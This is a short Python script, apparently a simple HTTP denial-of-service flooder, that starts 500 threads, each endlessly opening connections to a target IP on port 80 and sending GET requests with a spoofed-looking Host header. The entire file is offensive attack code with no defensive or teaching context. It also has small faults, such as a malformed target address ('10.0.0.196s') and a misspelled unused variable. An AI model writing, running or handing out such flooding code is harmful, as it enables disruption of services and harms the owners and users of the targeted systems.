import threading
import socket

target = '10.0.0.196s' #target IP address
port = 80
fake_ip = '182.20.83.64'

already_connnect = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'),(target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'),(target, port))
        s.close()

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()